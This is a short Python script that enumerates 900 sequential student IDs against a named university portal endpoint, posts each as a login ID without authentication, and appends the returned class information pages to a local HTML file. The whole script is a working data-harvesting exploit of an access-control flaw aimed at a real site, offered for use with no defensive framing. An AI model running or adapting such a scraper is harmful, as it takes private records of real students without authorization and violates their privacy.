import requests

url = 'https://www.pesuacademy.com/Academy/getStudentClassInfo.php'

srn=2201800001

for i in range(0,900):
    myobj = {'loginId': 'PES'+str(srn)}
    srn=srn+1
    print('Extracting => PES'+str(srn)+' successful.')
    x = requests.post(url, data = myobj)
    f = open("index.html", "a")
    f.write(x.text[465:len(x.text)-9])
f.write("</table></body></html>")
f.close()
print("Done")